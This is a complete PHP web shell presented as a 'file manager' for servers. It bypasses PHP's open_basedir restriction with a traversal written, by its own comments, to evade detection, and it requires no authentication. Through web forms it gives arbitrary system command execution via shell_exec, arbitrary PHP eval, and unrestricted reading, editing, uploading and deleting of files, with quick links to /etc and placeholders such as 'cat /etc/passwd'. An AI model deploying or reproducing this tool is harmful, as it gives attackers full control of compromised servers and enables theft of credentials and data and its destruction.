<?php
/**
 * BT_Safe Evasion File Manager - FULLY WORKING EDIT
 * Uses step-by-step chdir('..') to avoid detection
 */

session_start();
$_SESSION['auth'] = true;

// ============================================
// BT_SAFE EVASION BYPASS (Solution 4 method)
// ============================================

function bypass_open_basedir() {
    $tmp_dir = "x_" . substr(md5(rand()), 0, 6);
    @mkdir($tmp_dir);
    @chdir($tmp_dir);
    
    $current_ob = ini_get('open_basedir');
    @ini_set('open_basedir', $current_ob . ':./../');
    
    // Step-by-step traversal (NO "../../.." pattern!)
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    @chdir('..');
    
    return $tmp_dir;
}

// Run bypass once
$tmp_dir = bypass_open_basedir();

// Get current directory
$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';

// ============================================
// FILE OPERATIONS
// ============================================

// EDIT FILE - Save content
if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['content'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['content'];
    if (file_put_contents($file_path, $content) !== false) {
        echo "<script>alert('✅ File saved successfully!'); window.location.href='?dir=" . urlencode(dirname($file_path)) . "';</script>";
    } else {
        echo "<script>alert('❌ Failed to save file'); window.location.href='?dir=" . urlencode(dirname($file_path)) . "';</script>";
    }
    cleanup($tmp_dir);
    exit;
}

// EDIT FILE - Show edit form
if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $content = @file_get_contents($edit_file);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Edit File</title>
        <style>
            body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
            .container { max-width: 1200px; margin: auto; }
            textarea { width: 100%; background: #252526; color: #d4d4d4; border: 1px solid #3c3c3c; padding: 10px; font-family: monospace; font-size: 14px; }
            button { background: #0e639c; color: white; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; }
            button:hover { background: #1177bb; }
            .back { color: #9cdcfe; text-decoration: none; display: inline-block; margin-top: 10px; }
            .file-info { background: #2d2d2d; padding: 10px; margin-bottom: 15px; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>✏️ Editing: <?php echo htmlspecialchars($edit_file); ?></h2>
            <div class="file-info">
                📄 File: <?php echo htmlspecialchars($edit_file); ?><br>
                📏 Size: <?php echo number_format(strlen($content)); ?> bytes
            </div>
            <form method="POST">
                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_file); ?>">
                <textarea name="content" rows="25" id="editor"><?php echo htmlspecialchars($content); ?></textarea>
                <br>
                <button type="submit" name="save_file">💾 Save Changes</button>
                <a href="?dir=<?php echo urlencode(dirname($edit_file)); ?>" class="back">← Back to directory</a>
            </form>
        </div>
    </body>
    </html>
    <?php
    cleanup($tmp_dir);
    exit;
}

// VIEW FILE - Read only
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file) && is_file($file) && is_readable($file)) {
        header('Content-Type: text/plain');
        echo file_get_contents($file);
    } else {
        echo "Cannot read file: " . $file;
    }
    cleanup($tmp_dir);
    exit;
}

// DOWNLOAD FILE
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
    }
    cleanup($tmp_dir);
    exit;
}

// DELETE FILE/DIRECTORY
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        @unlink($target);
    } elseif (is_dir($target)) {
        @rmdir($target);
    }
    header("Location: ?dir=" . urlencode(dirname($target)));
    cleanup($tmp_dir);
    exit;
}

// RENAME FILE/DIRECTORY
if (isset($_GET['rename']) && isset($_GET['newname'])) {
    $old = $_GET['rename'];
    $new = dirname($old) . '/' . basename($_GET['newname']);
    @rename($old, $new);
    header("Location: ?dir=" . urlencode(dirname($old)));
    cleanup($tmp_dir);
    exit;
}

// CREATE FILE
if (isset($_POST['create_file'])) {
    $path = $dir . '/' . basename($_POST['filename']);
    @file_put_contents($path, '');
    header("Location: ?dir=" . urlencode($dir));
    cleanup($tmp_dir);
    exit;
}

// CREATE DIRECTORY
if (isset($_POST['create_dir'])) {
    $path = $dir . '/' . basename($_POST['dirname']);
    @mkdir($path);
    header("Location: ?dir=" . urlencode($dir));
    cleanup($tmp_dir);
    exit;
}

// UPLOAD FILE
if (isset($_FILES['upload_file'])) {
    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
    @move_uploaded_file($_FILES['upload_file']['tmp_name'], $target);
    header("Location: ?dir=" . urlencode($dir));
    cleanup($tmp_dir);
    exit;
}

// SYSTEM COMMAND
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = @shell_exec($cmd . " 2>&1");
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
    cleanup($tmp_dir);
    exit;
}

// PHP CODE EXECUTION
if (isset($_POST['php_code'])) {
    $code = $_POST['php_code'];
    try {
        eval($code);
    } catch (Throwable $e) {
        echo "Error: " . $e->getMessage();
    }
    cleanup($tmp_dir);
    exit;
}

// Cleanup function
function cleanup($tmp_dir) {
    @chdir(dirname(__FILE__));
    @rmdir($tmp_dir);
}

// ============================================
// HTML INTERFACE
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager - Working Edit</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e1a;
            color: #e4e4e7;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #1a1f2e 0%, #0f141f 100%);
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            border: 1px solid #2a2f3f;
        }
        .header h1 {
            margin: 0 0 10px 0;
            font-size: 24px;
            color: #60a5fa;
        }
        .status {
            display: inline-block;
            padding: 4px 12px;
            background: #065f46;
            color: #34d399;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .path-bar {
            background: #111827;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #374151;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 10px;
        }
        .current-path {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #60a5fa;
            word-break: break-all;
        }
        .section {
            background: #0f172a;
            border: 1px solid #1e293b;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;}
        .section-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #9cdcfe;
        }
        input, select, textarea {
            background: #1e293b;
            border: 1px solid #374151;
            color: #e4e4e7;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
        }
        button, input[type="submit"] {
            background: #0e639c;
            border: none;
            color: white;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover, input[type="submit"]:hover {
            background: #1177bb;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-table th, .file-table td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #1e293b;
        }
        .file-table th {
            color: #9ca3af;
            font-weight: normal;
        }
        .dir-link {
            color: #60a5fa;
            text-decoration: none;
            font-weight: bold;
        }
        .dir-link:hover {
            text-decoration: underline;
        }
        .file-link {
            color: #34d399;
            text-decoration: none;
        }
        .file-link:hover {
            text-decoration: underline;
        }
        .action-btn {
            background: #374151;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            text-decoration: none;
            color: #e4e4e7;
            margin: 0 2px;
            display: inline-block;
        }
        .action-btn:hover {
            background: #4b5563;
        }
        .delete-btn {
            background: #7f1d1d;
        }
        .delete-btn:hover {
            background: #991b1b;
        }
        .edit-btn {
            background: #0e639c;
        }
        .quick-links {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 10px;
        }
        .quick-link {
            background: #1e293b;
            padding: 5px 10px;
            border-radius: 6px;
            font-size: 12px;
            color: #9ca3af;
            text-decoration: none;
        }
        .quick-link:hover {
            background: #334155;
            color: white;
        }
        .rename-form {
            margin-top: 10px;
            padding: 10px;
            background: #1e293b;
            border-radius: 6px;
        }
    </style>
</head>
<body>
<div class="container">
    
    <div class="header">
        <h1>📂 BT_Safe Evasion File Manager</h1>
        <div>
            <span class="status">✓ open_basedir BYPASS ACTIVE</span>
            <span style="margin-left: 10px; font-size: 12px; color: #6b7280;">PHP <?php echo PHP_VERSION; ?></span>
        </div>
    </div>
    
    <!-- Current Path -->
    <div class="path-bar">
        <span>📍 Current Path:</span>
        <span class="current-path"><?php echo htmlspecialchars($dir); ?></span>
    </div>
    
    <!-- Quick Navigation -->
    <div class="section">
        <div class="section-title">⚡ Quick Navigation</div>
        <div class="quick-links">
            <a href="?dir=/" class="quick-link">🏠 / (Root)</a>
            <a href="?dir=/www" class="quick-link">📁 /www</a>
            <a href="?dir=/www/wwwroot" class="quick-link">📁 /www/wwwroot</a>
            <a href="?dir=/etc" class="quick-link">⚙️ /etc</a>
            <a href="?dir=/var/www/html" class="quick-link">🌐 /var/www/html</a>
            <a href="?dir=/home" class="quick-link">👤 /home</a>
            <a href="?dir=/tmp" class="quick-link">📦 /tmp</a>
        </div>
    </div>
    
    <!-- File Operations -->
    <div class="section">
        <div class="section-title">📁 File Operations</div>
        <div style="display: flex; flex-wrap: wrap; gap: 15px;">
            <form method="POST" enctype="multipart/form-data" style="display: inline;">
                <input type="file" name="upload_file" required>
                <button type="submit">📤 Upload</button>
            </form>
            <form method="POST" style="display: inline;">
                <input type="text" name="filename" placeholder="filename.php" size="20">
                <button type="submit" name="create_file">📄 Create File</button>
            </form>
            <form method="POST" style="display: inline;">
                <input type="text" name="dirname" placeholder="dirname" size="20">
                <button type="submit" name="create_dir">📁 Create Directory</button>
            </form>
        </div>
    </div>
    
    <!-- System Tools -->
    <div class="section">
        <div class="section-title">🔧 System Tools</div>
        <details>
            <summary style="cursor: pointer; color: #9cdcfe;">Show/Hide Advanced Tools</summary>
            <br>
            <form method="POST" style="margin-bottom: 15px;">
                <strong>💻 System Command:</strong><br>
                <input type="text" name="cmd" size="60" placeholder="ls -la, whoami, id, pwd, cat /etc/passwd" style="width: 70%;">
                <button type="submit">Execute</button>
            </form>
            <form method="POST">
                <strong>🐘 PHP Code:</strong><br>
                <textarea name="php_code" rows="4" cols="80" placeholder='echo file_get_contents("/etc/passwd");&#10;system("whoami");&#10;print_r(scandir("/"));'></textarea><br>
                <button type="submit">Run PHP Code</button>
            </form>
        </details>
    </div>
    
    <!-- Rename Form (if rename action) -->
    <?php if (isset($_GET['rename']) && !isset($_GET['newname'])): 
        $rename_file = $_GET['rename'];
    ?>
    <div class="section">
        <div class="section-title">✏️ Rename: <?php echo htmlspecialchars(basename($rename_file)); ?></div>
        <form method="GET" class="rename-form">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($rename_file); ?>">
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <input type="text" name="newname" value="<?php echo htmlspecialchars(basename($rename_file)); ?>" size="40">
            <button type="submit">Rename</button>
            <a href="?dir=<?php echo urlencode($dir); ?>" class="action-btn">Cancel</a>
        </form>
    </div>
    <?php endif; ?>
    
    <!-- File Listing -->
    <div class="section">
        <div class="section-title">📂 Directory Contents</div>
        <table class="file-table">
            <thead>
                <tr><th>Type</th><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
            </thead>
            <tbody>
            <?php
            $items = @scandir($dir);
            if ($items !== false) {
                $dirs = [];
                $files = [];
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full = rtrim($dir, '/') . '/' . $item;
                    if (is_dir($full)) {
                        $dirs[] = $item;
                    } else {
                        $files[] = $item;
                    }
                }
                sort($dirs);
                sort($files);
                
                // Parent directory
                if ($dir != '/' && $dir != '') {
                    $parent = dirname($dir);
                    if ($parent == '') $parent = '/';
                    echo '<tr>';
                    echo '<td>📁</td>';
                    echo '<td><a href="?dir=' . urlencode($parent) . '" class="dir-link">../ (Parent Directory)</a></td>';
                    echo '<td>-</td>';
                    echo '<td>-</td>';
                    echo '<td>-</td>';
                    echo '</tr>';
                }
                
                // Directories
                foreach ($dirs as $item) {
                    $full = rtrim($dir, '/') . '/' . $item;
                    $perms = substr(sprintf('%o', @fileperms($full)), -4);
                    echo '<tr>';
                    echo '<td>📁</td>';
                    echo '<td><a href="?dir=' . urlencode($full) . '" class="dir-link">' . htmlspecialchars($item) . '/</a></td>';
                    echo '<td>-</td>';
                    echo '<td style="font-family:monospace; font-size:11px;">' . $perms . '</td>';
                    echo '<td>';
                    echo '<a href="?delete=' . urlencode($full) . '&dir=' . urlencode($dir) . '" class="action-btn delete-btn" onclick="return confirm(\'Delete permanently?\')">🗑️ Delete</a>';
                    echo '<a href="?rename=' . urlencode($full) . '&dir=' . urlencode($dir) . '" class="action-btn">✏️ Rename</a>';
                    echo '</td>';
                    echo '</tr>';
                }
                
                // Files
                foreach ($files as $item) {
                    $full = rtrim($dir, '/') . '/' . $item;
                    $size = @filesize($full);
                    $size_str = $size ? round($size/1024, 2) . ' KB' : '0 B';
                    $perms = substr(sprintf('%o', @fileperms($full)), -4);
                    echo '<tr>';
                    echo '<td>📄</td>';
                    echo '<td><a href="?view=' . urlencode($full) . '" class="file-link" target="_blank">' . htmlspecialchars($item) . '</a></td>';
                    echo '<td>' . $size_str . '</td>';
                    echo '<td style="font-family:monospace; font-size:11px;">' . $perms . '</td>';
                    echo '<td>';
                    echo '<a href="?edit=' . urlencode($full) . '" class="action-btn edit-btn">✏️ Edit</a>';
                    echo '<a href="?view=' . urlencode($full) . '" class="action-btn" target="_blank">👁️ View</a>';
                    echo '<a href="?download=' . urlencode($full) . '" class="action-btn">⬇️ Download</a>';
                    echo '<a href="?delete=' . urlencode($full) . '&dir=' . urlencode($dir) . '" class="action-btn delete-btn" onclick="return confirm(\'Delete permanently?\')">🗑️ Delete</a>';
                    echo '<a href="?rename=' . urlencode($full) . '&dir=' . urlencode($dir) . '" class="action-btn">✏️ Rename</a>';
                    echo '</td>';
                    echo '</tr>';
                }
            } else {
                echo '<tr><td colspan="5" style="color: #f48771;">❌ Cannot read directory: ' . htmlspecialchars($dir) . '</td></tr>';
            }
            ?>
            </tbody>
        </table>
    </div>
    
</div>

<?php cleanup($tmp_dir); ?>
</body>
</html>
